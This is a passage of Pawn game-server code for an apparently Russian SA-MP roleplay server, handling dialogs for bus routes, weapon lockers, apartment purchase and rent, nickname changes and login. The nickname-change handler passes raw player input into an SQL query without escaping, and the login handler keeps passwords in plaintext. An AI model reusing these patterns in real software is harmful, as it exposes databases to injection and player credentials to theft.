					gangzonesa[playerid] = GangZoneCreate(X-95,Y-80,X+70,Y+85);
					GangZoneShowForPlayer(playerid,gangzonesa[playerid],COLOR_BLACK);
					timecar[playerid] = 300;
				}
			}
		}
	case 1745:
		{
			if(!response) return true;
			if(GetPlayerVehicleID(playerid) >= buscar[0] && GetPlayerVehicleID(playerid) <= buscar[1]) SetPVarInt(playerid, "TypeBus", 1);
			else if(GetPlayerVehicleID(playerid) >= buscar[2] && GetPlayerVehicleID(playerid) <= buscar[3]) SetPVarInt(playerid, "TypeBus", 2);
			else if(GetPlayerVehicleID(playerid) >= buscar[4] && GetPlayerVehicleID(playerid) <= buscar[5]) SetPVarInt(playerid, "TypeBus", 3);
			else return true;
			new name[35];
			switch(GetPVarInt(playerid,"TypeBus"))
			{
			case 1: name = "ВнутриГородской ЛС";
			case 2: name = "ВнутриГородской СФ";
			case 3: name = "ВнутриГородской ЛВ";
			}
			format(string, 180, " Водитель автобуса %s начал маршрут %s. Проезд: бесплатный", PlayerInfo[playerid][pName], name);
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			format(string, 90, "%s\n<< Проезд бесплатный >>", name);
			JobText3D[GetPlayerVehicleID(playerid)] = Create3DTextLabel(string, COLOR_GREEN, 0.0, 0.0, 2.25, 50.0,0,1);
			Attach3DTextLabelToVehicle(JobText3D[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.0, 0.0, 2.25);
			pPressed[playerid] = 0;
			new i = pPressed[playerid], type = GetPVarInt(playerid, "TypeBus");
			if(type == 1) SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],7.0);
			if(type == 2) SetPlayerRaceCheckpoint(playerid,0,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],7.0);
			if(type == 3){SetPlayerRaceCheckpoint(playerid,0,BusCityLV[76][0],BusCityLV[76][1],BusCityLV[76][2],BusCityLV[76][3],BusCityLV[76][4],BusCityLV[76][5],5.0); pPressed[playerid] = 76; }
			return true;
		}
	case 163:
		{
			if(!response) return true;
			new name[35];
			switch(listitem)
			{
			case 0: name = "АвтоВокзал LS << >> Автошкола SF";
			case 1: name = "АвтоВокзал LS << >> АвтоВокзал LV";
			case 2: name = "АвтоВокзал LS << >> Заводы";
			}
			SetPVarInt(playerid, "TypeBus", listitem+4);
			format(string, 180, " Водитель автобуса %s начал маршрут %s. Проезд: бесплатный", PlayerInfo[playerid][pName], name);
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			format(string, 90, "%s\n<< Проезд бесплатный >>", name);
			JobText3D[GetPlayerVehicleID(playerid)] = Create3DTextLabel(string, COLOR_GREEN, 0.0, 0.0, 2.25, 50.0,0,1);
			Attach3DTextLabelToVehicle(JobText3D[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.0, 0.0, 2.25);
			pPressed[playerid] = 0;
			new i = pPressed[playerid], type = GetPVarInt(playerid, "TypeBus");
			if(type == 4) SetPlayerRaceCheckpoint(playerid,0,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],7.0);
			if(type == 5) SetPlayerRaceCheckpoint(playerid,0,BusLSLV[i][0],BusLSLV[i][1],BusLSLV[i][2],BusLSLV[i][3],BusLSLV[i][4],BusLSLV[i][5],5.0);
			if(type == 6) SetPlayerRaceCheckpoint(playerid,0,BusLSZavodi[i][0],BusLSZavodi[i][1],BusLSZavodi[i][2],BusLSZavodi[i][3],BusLSZavodi[i][4],BusLSZavodi[i][5],5.0);
			return true;
		}
	case 5225:
		{
			if(!response) return DeletePVar(playerid,"lsaammo");
			if(GetPVarInt(playerid,"lsaammo") && lsamatbi < 100) return SCM(playerid,COLOR_GREY," На складе недостаточно материалов");
			else if(PlayerInfo[playerid][pMember] == 1 && lspdmatbi < 100) return SCM(playerid,COLOR_GREY," На складе недостаточно материалов");
			else if(PlayerInfo[playerid][pMember] == 2 && fbimats < 100) return SCM(playerid,COLOR_GREY," На складе недостаточно материалов");
			else if(PlayerInfo[playerid][pMember] == 10 && sfpdmats < 100) return SCM(playerid,COLOR_GREY," На складе недостаточно материалов");
			else if(PlayerInfo[playerid][pMember] == 21 && lvpdmats < 100) return SCM(playerid,COLOR_GREY," На складе недостаточно материалов");
			else if(PlayerInfo[playerid][pMember] == 3 && armmatsf < 100) return SCM(playerid,COLOR_GREY," На складе недостаточно материалов");
			else if(PlayerInfo[playerid][pMember] == 19 && armmatbi < 100) return SCM(playerid,COLOR_GREY," На складе недостаточно материалов");
			new guns[2];
			switch(listitem)
			{
			case 0:
				{
					GetPlayerWeaponData(playerid, 2, guns[0], guns[1]);
					if(guns[0] == 24 && guns[1] == 0 || guns[0] != 24) DeletePVar(playerid,"_Deagle");
					SetPVarInt(playerid,"_Deagle",GetPVarInt(playerid,"_Deagle")+1);
					if(guns[0] == 24 && guns[1] > 0 && GetPVarInt(playerid,"_Deagle") > 2)
					{
					   SCM(playerid,COLOR_GREY," Вы не можете взять больше патронов для этого оружия");
 			           ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
					   "Оружие\tПатроны\n\
					   Desert Eagle\t[21п]\n\
					   Shotgun\t[30п]\n\
					   MP5\t[90п]\n\
					   M4A1\t[150п]\n\
					   Rifle\t[30п]\n\
					   Броня\n\
					   Спец оружие\n",
					   "Взять", "Отмена");
					   return true;
					}
					GiveWeapon(playerid,24,21);
					SCM(playerid, 0x9b000ff," Выдано: Desert Eagle (3 обоймы)");
				}
			case 1:
				{
					GetPlayerWeaponData(playerid, 3, guns[0], guns[1]);
					if(guns[0] == 25 && guns[1] == 0 || guns[0] != 25) DeletePVar(playerid,"_Shotgun");
					SetPVarInt(playerid,"_Shotgun",GetPVarInt(playerid,"_Shotgun")+1);
					if(guns[0] == 25 && guns[1] > 0 && GetPVarInt(playerid,"_Shotgun") > 2)
					{
		               SCM(playerid,COLOR_GREY," Вы не можете взять больше патронов для этого оружия");
 			           ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
					   "Оружие\tПатроны\n\
					   Desert Eagle\t[21п]\n\
					   Shotgun\t[30п]\n\
					   MP5\t[90п]\n\
					   M4A1\t[150п]\n\
					   Rifle\t[30п]\n\
					   Броня\n\
					   Спец оружие\n",
					   "Взять", "Отмена");
					   return true;
					}
					GiveWeapon(playerid,25,30);
					SCM(playerid, 0x9b000ff," Выдано: Shotgun (30 патрон)");
				}
			case 2:
				{
					GetPlayerWeaponData(playerid, 4, guns[0], guns[1]);
					if(guns[0] == 29 && guns[1] == 0 || guns[0] != 29) DeletePVar(playerid,"_MP5");
					SetPVarInt(playerid,"_MP5",GetPVarInt(playerid,"_MP5")+1);
					if(guns[0] == 29 && guns[1] > 0 && GetPVarInt(playerid,"_MP5") > 2)
					{
                       SCM(playerid,COLOR_GREY," Вы не можете взять больше патронов для этого оружия");
 			           ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
					   "Оружие\tПатроны\n\
					   Desert Eagle\t[21п]\n\
					   Shotgun\t[30п]\n\
					   MP5\t[90п]\n\
					   M4A1\t[150п]\n\
					   Rifle\t[30п]\n\
					   Броня\n\
					   Спец оружие\n",
					   "Взять", "Отмена");
					   return true;
					}
					GiveWeapon(playerid,29,90);
					SCM(playerid, 0x9b000ff," Выдано: SMG (3 обоймы)");
				}
			case 3:
				{
					GetPlayerWeaponData(playerid, 5, guns[0], guns[1]);
					if(guns[0] == 31 && guns[1] == 0 || guns[0] != 31) DeletePVar(playerid,"_M4A1");
					SetPVarInt(playerid,"_M4A1",GetPVarInt(playerid,"_M4A1")+1);
					if(guns[0] == 31 && guns[1] > 0 && GetPVarInt(playerid,"_M4A1") > 2)
					{
                       SCM(playerid,COLOR_GREY," Вы не можете взять больше патронов для этого оружия");
 			           ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
					   "Оружие\tПатроны\n\
					   Desert Eagle\t[21п]\n\
					   Shotgun\t[30п]\n\
					   MP5\t[90п]\n\
					   M4A1\t[150п]\n\
					   Rifle\t[30п]\n\
					   Броня\n\
					   Спец оружие\n",
					   "Взять", "Отмена");
					   return true;
					}
					GiveWeapon(playerid,31,150);
					SCM(playerid, 0x9b000ff," Выдано: M4A1 (3 обоймы)");
				}
			case 4:
				{
					GetPlayerWeaponData(playerid, 6, guns[0], guns[1]);
					if(guns[0] == 33 && guns[1] == 0 || guns[0] != 33) DeletePVar(playerid,"_Rifle");
					SetPVarInt(playerid,"_Rifle",GetPVarInt(playerid,"_Rifle")+1);
					if(guns[0] == 33 && guns[1] > 0 && GetPVarInt(playerid,"_Rifle") > 2)
					{
                       SCM(playerid,COLOR_GREY," Вы не можете взять больше патронов для этого оружия");
 			           ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
					   "Оружие\tПатроны\n\
					   Desert Eagle\t[21п]\n\
					   Shotgun\t[30п]\n\
					   MP5\t[90п]\n\
					   M4A1\t[150п]\n\
					   Rifle\t[30п]\n\
					   Броня\n\
					   Спец оружие\n",
					   "Взять", "Отмена");
					   return true;
					}
					GiveWeapon(playerid,33,30);
					SCM(playerid, 0x9b000ff," Выдано: Rifle (30 патронов)");
				}
			case 5:
				{
					new Float:armour;
					GetPlayerArmour(playerid,armour);
					if(armour > 90)
					{
					    SCM(playerid,COLOR_GREY," Подождите немного");
                        ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
					    "Оружие\tПатроны\n\
					    Desert Eagle\t[21п]\n\
					    Shotgun\t[30п]\n\
					    MP5\t[90п]\n\
					    M4A1\t[150п]\n\
					    Rifle\t[30п]\n\
					    Броня\n\
					    Спец оружие\n",
					    "Взять", "Отмена");
					    return true;
					}
					SetPlayerHealthAC(playerid, 100.0);
					SetPlayerArmourAC(playerid, 100);
					PlayerInfo[playerid][pSatiety] = 100;
					SCM(playerid, 0x9b000ff," Выдано: Броня");
					mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pHP = '%f', pArmour = '%f' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pHP], PlayerInfo[playerid][pArmour],PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
				}
			case 6:
				{
				    GetPlayerWeaponData(playerid, 1, guns[0], guns[1]);
					if(guns[0] == 3 && guns[1] > 0)
					{
                       SCM(playerid,COLOR_GREY," Вы не можете взять больше патронов для этого оружия");
 			           ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
					   "Оружие\tПатроны\n\
					   Desert Eagle\t[21п]\n\
					   Shotgun\t[30п]\n\
					   MP5\t[90п]\n\
					   M4A1\t[150п]\n\
					   Rifle\t[30п]\n\
					   Броня\n\
					   Спец оружие\n",
					   "Взять", "Отмена");
					   return true;
					}
				    switch(PlayerInfo[playerid][pMember])
				    {
				        case 1, 10, 21:
				        {
				        	GiveWeapon(playerid,3,1);
				        }
				        case 2:
				        {
				        	GiveWeapon(playerid,17,10);
				        }
				        case 3, 19:
				        {
				        	GiveWeapon(playerid,46,1);
				        }
				    }
				    SCM(playerid, 0x9b000ff," Выдано: Спец оружие");
				}
				case 7:
			    {
			        SetPlayerArmourAC(playerid, 0);
			        SCM(playerid, 0x9b000ff," Броня снята");
			    }
			}
			
			if(GetPVarInt(playerid,"lsaammo")) lsamatbi-=100;
			else if(PlayerInfo[playerid][pMember] == 1) lspdmatbi-=100;
			else if(PlayerInfo[playerid][pMember] == 2) fbimats-=100;
			else if(PlayerInfo[playerid][pMember] == 10) sfpdmats-=100;
			else if(PlayerInfo[playerid][pMember] == 21) lvpdmats-=100;
			else if(PlayerInfo[playerid][pMember] == 3) armmatsf-=100;
			else if(PlayerInfo[playerid][pMember] == 19) armmatbi-=100;
            return ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
		    "Оружие\tПатроны\n\
		    Desert Eagle\t[21п]\n\
		    Shotgun\t[30п]\n\
		    MP5\t[90п]\n\
		    M4A1\t[150п]\n\
		    Rifle\t[30п]\n\
		    Броня\n\
		    Спец оружие\n",
		    "Взять", "Отмена");
		}
	case 6700:
		{
			if(!response) return true;
			new i = GetPlayerVirtualWorld(playerid)-50;
			switch(listitem)
			{
			case 0: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/buyhouse");
			case 1: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/sellhouse");
			case 2: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/open");
			case 3: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/healme");
			case 4: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/buyinterior");
			case 5:
				{
					if(!HGet(playerid) || PlayerInfo[playerid][pPHouseKey] != i) return SCM(playerid,COLOR_GREY," Это не ваш дом");
					format(string,128,"{ffffff}Аптечек: %i штук\n{ffffff}Дверной замок: %s \n",HouseInfo[i][hHel], (HouseInfo[i][hLock] ? ("Закрыт"):("Открыт")));
					ShowPlayerDialogEx(playerid,64,DIALOG_STYLE_MSGBOX,"Информация",string,"Ок","");
				}
			}
		}
	case 8003:
		{
			if(response)
			{
				new i = GetPlayerVirtualWorld(playerid);
				switch(listitem)
				{
				case 0: ShowPlayerDialogEx(playerid, 8008, 0, "Подтверждение", "Вы точно хотите купить квартиру?\nПри продаже вам вернется 50% от стоимости.\nПри выселении вам ничего не вернется!", "Да", "Нет");
				case 1: ShowPlayerDialogEx(playerid, 8009, 0, "Подтверждение", "Вы точно хотите продать квартиру?", "Да", "Нет");
				case 2: ShowPlayerDialogEx(playerid, 8010, 2, "Квартплата", "Остаток\n - На час\n - На 5 часов\n - На сутки\n - На 3 суток\n - На неделю", "Перевести", "Отмена");
				case 3:
					{
						if(!KGet(playerid)) return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
						if(i != PlayerInfo[playerid][pKvartiraKey])return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
						if(kvartinfo[i][lock] == 0) kvartinfo[i][lock] = 1, SCM(playerid, COLOR_RED, " Дверь закрыта.");
						else kvartinfo[i][lock] = 0, SCM(playerid, COLOR_LIGHTGREEN, " Дверь открыта.");
					}
				case 4:
					{
						if(kvartinfo[i][aptek] == 0) return SCM(playerid, COLOR_GREY, "В квартире нет аптечек");
						else
						{
							kvartinfo[i][aptek] -= 1;
							SetPlayerHealth(playerid, 100);
							SCM(playerid, 0xFFFF00AA, "Вы вылечены");
						}
					}
				case 5: ShowPlayerDialogEx(playerid, 8018, 2, "Сменить интерьер", "Базовый - 5 000 вирт\nИностранный - 100 000 вирт\nМоренго - 150 000 вирт", "Купить", "Отмена");
				case 6:
					{
						new lockkkk[8];
						if(kvartinfo[i][lock] == 1)lockkkk = "Закрыта";
						else lockkkk = "Открыта";
						format(string,128,"{ffffff}Аптечек: %i штук\n{ffffff}Дверной замок: %s \n",kvartinfo[i][aptek], lockkkk);
						ShowPlayerDialogEx(playerid,64,DIALOG_STYLE_MSGBOX,"Информация",string,"Ок","");
					}
				}
			}
		}
	case 8008:
		{
			if(!response) return true;
			new i = GetPlayerVirtualWorld(playerid);
			if(!strcmp(kvartinfo[i][vladelec],"None",true))
			{
				if(KGet(playerid) || HGet(playerid))return SCM(playerid, COLOR_GREY, " У вас уже есть кварира / дом!");
				if(PlayerInfo[playerid][pBank] < kvartinfo[i][kCena] && booston == 0) return SCM(playerid, COLOR_GREY, " Недостаточно денег на банковском счету");
				if(PlayerInfo[playerid][pBank] < kvartinfo[i][kCena]-kvartinfo[i][kCena]*40/100 && booston == 1) return SCM(playerid, COLOR_GREY, " Недостаточно денег на банковском счету");
				strmid(kvartinfo[i][vladelec], PlayerInfo[playerid][pName], 0, strlen(PlayerInfo[playerid][pName]), 32);
				SCM(playerid, -1, " Поздравляем с покупкой!");
				SCM(playerid, 0xFFFF00AA, " Внимание! Вас могут выселить если квартира не будет вовремя оплачена");
				SCM(playerid, 0xFFFF00AA, " Стоимость квартплаты: 100 вирт в час");
				switch(booston)
				{
				case 0:PlayerInfo[playerid][pBank] -= kvartinfo[i][kCena];
				case 1:PlayerInfo[playerid][pBank] -= kvartinfo[i][kCena]-kvartinfo[i][kCena]*40/100;
				}
				KGet(playerid);
				CarInfo[playerid][carFuel][0] = 100;
				updatekvar(i);
				return true;
			}
			else return SCM(playerid, COLOR_GRAD1, " Квартира не продается");
		}
	case 8009:
		{
			if(!response) return true;
			new i = GetPlayerVirtualWorld(playerid);
			if(!KGet(playerid)) return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
			if(PlayerInfo[playerid][pKvartiraKey] != i)return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
			strmid(kvartinfo[i][vladelec], "None", 0, strlen("None"), 5);
			PlayerInfo[playerid][pKvartiraKey] = 9999;
			kvartinfo[i][lock] = 0;
			kvartinfo[i][plata] = 0;
			switch(booston)
			{
			case 0:PlayerInfo[playerid][pBank] += kvartinfo[i][kCena]/2;
			case 1:PlayerInfo[playerid][pBank] += kvartinfo[i][kCena]*40/100/2;
			}
			SCM(playerid, -1, " Квартира продана");
			updatekvar(i);
		}
	case 8010:
		{
			if(!response) return true;
			new i = GetPlayerVirtualWorld(playerid), dengi;
			if(!KGet(playerid)) return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
			if(PlayerInfo[playerid][pKvartiraKey] != i)return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
			switch(listitem)
			{
			case 0:return format(string,90,"Оплачено на: [%i дней]",kvartinfo[i][plata]/2400), SCM(playerid,COLOR_YELLOW,string);
			case 1:dengi = 100;
			case 2:dengi = 500;
			case 3:dengi = 2400;
			case 4:dengi = 7200;
			case 5:dengi = 16800;
			}
			if(kvartinfo[i][plata]+dengi > 16801)return SCM(playerid,-1," Неверная сумма");
			if(PlayerInfo[playerid][pBank] < dengi)return SCM(playerid, 0xAA3333AA, " Недостаточно денег на банковском счету");
			kvartinfo[i][plata] += dengi;
			PlayerInfo[playerid][pBank] -= dengi;
			format(string,90," Вы перевели: %i вирт",dengi);
			SCM(playerid,COLOR_YELLOW,string);
			return true;
		}
	case 8018:
		{
			if(!response) return true;
			new i = GetPlayerVirtualWorld(playerid);
			if(!KGet(playerid)) return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
			if(PlayerInfo[playerid][pKvartiraKey] != i)return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
			switch(listitem)
			{
			case 0:
				{
					if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 0) return SCM(playerid,COLOR_GREY," Вы уже приобрели этот интерьер");
					if(PlayerInfo[playerid][pBank] <= 5000) return SCM(playerid,COLOR_GREY," На вашем банковском счету недостаточно денег");
					SCM(playerid,0x6495EDFF," Вы приобрели новый интерьер!");
					kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] = 0;
					PlayerInfo[playerid][pBank] -= 5000;
					if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 0)
					{
						SetPVarInt(playerid, "podeezd", kvartinfo[PlayerInfo[playerid][pKvartiraKey]][virtmir]);
						SetPlayerPos(playerid,2283.3474,-1139.2313,1050.8984);
						SetPlayerInterior(playerid,11);
						SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pKvartiraKey]);
						return true;
					}
				}
			case 1:
				{
					if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 1) return SCM(playerid,COLOR_GREY," Вы уже приобрели этот интерьер");
					if(PlayerInfo[playerid][pBank] <= 100000) return SCM(playerid,COLOR_GREY," На вашем банковском счету недостаточно денег");
					SCM(playerid,0x6495EDFF," Вы приобрели новый интерьер!");
					kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] = 1;
					PlayerInfo[playerid][pBank] -= 100000;
					if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 1)
					{
						SetPVarInt(playerid, "podeezd", kvartinfo[PlayerInfo[playerid][pKvartiraKey]][virtmir]);
						SetPlayerPos(playerid,31.3584,-84.8000,1004.2859);
						SetPlayerInterior(playerid,15);
						SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pKvartiraKey]);
						return true;
					}
				}
			case 2:
				{
					if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 2) return SCM(playerid,COLOR_GREY," Вы уже приобрели этот интерьер");
					if(PlayerInfo[playerid][pBank] <= 150000) return SCM(playerid,COLOR_GREY," На вашем банковском счету недостаточно денег");
					SCM(playerid,0x6495EDFF," Вы приобрели новый интерьер!");
					kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] = 2;
					PlayerInfo[playerid][pBank] -= 150000;
					if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 2)
					{
						SetPVarInt(playerid, "podeezd", kvartinfo[PlayerInfo[playerid][pKvartiraKey]][virtmir]);
						SetPlayerPos(playerid,58.2073,-79.1497,1004.2859);
						SetPlayerInterior(playerid,15);
						SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pKvartiraKey]);
						return true;
					}
				}
			}
			return true;
		}
	case 6485:
		{
			if(!response) return true;
			new i = GetPVarInt(playerid, "podeezd");
			if(listitem == 0)
			{
				SetPlayerPos(playerid, PodeezdInfo[i][podPicX],PodeezdInfo[i][podPicY],PodeezdInfo[i][podPicZ]);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,0);
				DeletePVar(playerid, "podeezd");
				return true;
			}
			else
			{
				switch(PodeezdInfo[i][podInt])
				{
				case 0:
					{
						SetPlayerPos(playerid, 2240.9590, -1190.6875, 1033.7969);
						SetPlayerVirtualWorld(playerid,	PodeezdInfo[i][podMir][listitem]);
						SetPlayerInterior(playerid,15);
					}
				case 1:
					{
						SetPlayerPos(playerid, 2268.0962,1647.3221,1084.2344);
						SetPlayerVirtualWorld(playerid,	PodeezdInfo[i][podMir][listitem]);
						SetPlayerInterior(playerid,1);
					}
				}
			}
			return true;
		}
	case 8999:
		{
			if(!response) return DeletePVar(playerid, "podeezd");
			new i = GetPVarInt(playerid, "podeezd");
			if(listitem == 0)
			{
				if(KGet(playerid))
				{
					if(CarInfo[playerid][carModel][0] == 462)return SCM(playerid,COLOR_GRAD1," У вас нет автомобиля");
					else if(house_car[playerid] != -1)return SCM(playerid,COLOR_GREY," Автомобиль уже используется");
					new hh = GetPVarInt(playerid, "podeezd");
					if(hh != kvartinfo[PlayerInfo[playerid][pKvartiraKey]][virtmir]) return SCM(playerid,COLOR_GREY," Вы должны находиться возле своего подъезда");
					house_car[playerid] = CreateVehicle(CarInfo[playerid][carModel][0], PodeezdInfo[hh][carX], PodeezdInfo[hh][carY], PodeezdInfo[hh][carZ], PodeezdInfo[hh][carC] , CarInfo[playerid][carColor_one][0] ,CarInfo[playerid][carColor_two][0], 86400);
					SetVehicleParamsEx(house_car[playerid],false,false,false,true,false,false,false);
					CarHealth[house_car[playerid]] = float(1000);
					createdcar = house_car[playerid];
					Fuell[house_car[playerid]] = CarInfo[playerid][carFuel][0];
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					LoadTuning(playerid,house_car[playerid],0);
					AnRepairVehicle(house_car[playerid]);
					SCM(playerid,COLOR_YELLOW," Теперь вы можете забрать свою машину");
					DeletePVar(playerid, "podeezd");
				}
				else return SCM(playerid, COLOR_GREY, " У вас нет квартиры!");
			}
			else
			{
				switch(PodeezdInfo[i][podInt])
				{
				case 0:
					{
						SetPlayerPos(playerid, 2240.9590, -1190.6875, 1033.7969);
						SetPlayerVirtualWorld(playerid,	PodeezdInfo[i][podMir][listitem]);
						SetPlayerInterior(playerid,15);
					}
				case 1:
					{
						SetPlayerPos(playerid, 2268.0962,1647.3221,1084.2344);
						SetPlayerVirtualWorld(playerid,	PodeezdInfo[i][podMir][listitem]);
						SetPlayerInterior(playerid,1);
					}
				}
			}
			return true;
		}
	case 10399:
		{
			if(response)
			{
				new skin = PlayerInfo[playerid][pChar][0];
				PlayerInfo[playerid][pChar][0] = PlayerInfo[playerid][pChar][listitem+1];
				SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
				PlayerInfo[playerid][pChar][listitem+1] = skin;
				ShowPlayerDialogEx(playerid,10399,DIALOG_STYLE_LIST, "Гардероб","Вешалка №1\nВешалка №2\nВешалка №3\nВешалка №4\nВешалка №5", "Одеть", "Выйти");
			}
			else SpawnPlayer(playerid);
		}
	case 10:
		{
			if(response)
			{
				if(!strlen(inputtext) || strlen(inputtext) > 70)return ShowPlayerDialogEx(playerid,10,DIALOG_STYLE_INPUT, "Жалоба администрации", "Вы собираетесь отправить администрации сообщение с жалобой\nОтправляйте по форме [ID/ник нарушитиля] [Текст жалобы]", "Отправить", "Назад");
				format(YCMDstr, sizeof(YCMDstr), "/aquestion %s", (inputtext));
				CallLocalFunction("OnPlayerCommandText", "is", playerid, YCMDstr);
				return true;
			}
			else return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
		}
	case 229:
		{
			if(response)
			{
				if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,229,DIALOG_STYLE_INPUT, "Задать вопрос по игре", "Напишите свой вопрос", "Отправить", "Назад");
				format(YCMDstr, sizeof(YCMDstr), "/question %s", (inputtext));
				CallLocalFunction("OnPlayerCommandText", "is", playerid, YCMDstr);
				return true;
			}
			else return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
		}
	case 10352:
		{
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 1000000) return SCM(playerid, COLOR_GRAD1, " Для смены ника требуется 1000000 вирт на банковском счету");
				if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,10352,DIALOG_STYLE_INPUT, "Смена имени", "Введите новое имя\n\tИмя должно иметь формат: Имя_Фамилия\n\tИмя может содержать буквы от A-z и символ '_'\n\tДлина имени не может быть более 20 символов\n\tСтоимость смены имени 1000000 вирт", "Готово", "Назад");
                mysql_format(DATABASE, QUERY, 256, "SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'", inputtext);
				mysql_query(DATABASE, QUERY);
				new r = cache_num_rows();
				if(r)
				{
				    SCM(playerid, COLOR_GREY, " Данный ник используется");
				}
				else
				{
					PlayerInfo[playerid][pBank] -=1000000;
					format(WantNickChange[playerid],MAX_PLAYER_NAME, "%s",inputtext);
					format(string, 256, " [Заявка на смену ника] %s[%i] просит сменить ник на: %s", Name(playerid),playerid,(inputtext));
					ABroadCast(COLOR_LIGHTGREEN, string, 1);
					SCM(playerid, -1, " Ваша заявка отправлена. Ждите подтверждения мэром штата");
					SendFamilyMessage(7, TEAM_BLUE_COLOR, string);
					return true;
				}
			}
		}
	case 1:
		{
			if(!response) return SCM(playerid, COLOR_LIGHTRED, "Вы были отключены от сервера! Чтобы выйти введите /q(uit)"),Kick(playerid);
			if(!strlen(inputtext))
			{
  	            format(string, 344, "{FFFFFF}С возращением на сервер {AE433D}%s.\n\n\
					{FFFFFF}Аккаунт c логином {AE433D}%s {FFFFFF}успешно найден.\n\
				    {FFFFFF}Для продолжение, введите ваш пароль от аккаунта.\n\n\
					{FFFFFF}При потери пароля, его можно восстановить на сайте {AE433D}%s\n\n\
					{FFFFFF}На авторизацию даётся 120 секунд!",
				NameServer, PlayerInfo[playerid][pName], NameSite
				);
				ShowPlayerDialogEx(playerid, 1, DIALOG_STYLE_PASSWORD, "{AE433D}Авторизация | {FFFFFF}Ввод пароля", string, "Войти", "Отмена");
				return true;
			}
			for(new i = strlen(inputtext); i != 0; --i)
			switch(inputtext[i])
			{
			case 'А'..'Я', 'а'..'я', ' ':
				return ShowPlayerDialogEx(playerid,1,DIALOG_STYLE_MSGBOX, "Ошибка!", "{00FF21}Введенный вами пароль содержит русские буквы.\n Смените раскладку клавиатуры!", "Повтор", "");
			}
			strmid(PlayerInfo[playerid][pKey],inputtext, 0, strlen(inputtext), 32);
			mysql_format(DATABASE,QUERY,256,"SELECT * FROM `"TABLE_BAN"` WHERE `Name` = '%s'",PlayerInfo[playerid][pName]);
			SetPVarInt(playerid,"time_logged",120);
			return mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",25,playerid,"");
		}
	case 3439:
		{
			if(response)
			{
				if(listitem == 0)
				{
					ShowPlayerDialogEx(playerid, 3440, DIALOG_STYLE_INPUT, "Урок по изучению Box", "Введите [ID] обучаемого", "Начать", "Отмена");
					return true;
				}
				else if(listitem == 1)
				{
					ShowPlayerDialogEx(playerid, 3441, DIALOG_STYLE_INPUT, "Урок по изучению Kong Fu", "Введите [ID] обучаемого", "Начать", "Отмена");
					return true;
				}
				else if(listitem == 2)
				{
					ShowPlayerDialogEx(playerid, 3444, DIALOG_STYLE_INPUT, "Урок по изучению Kick Box", "Введите [ID] обучаемого", "Начать", "Отмена");
					return true;
				}
				else if(listitem == 3)
				{
					ShowPlayerDialogEx(playerid, 3442, DIALOG_STYLE_INPUT, "Завершить урок по Box", "Введите [ID] обучаемого", "Завершить", "Отмена");
					return true;
				}
				else if(listitem == 4)
				{
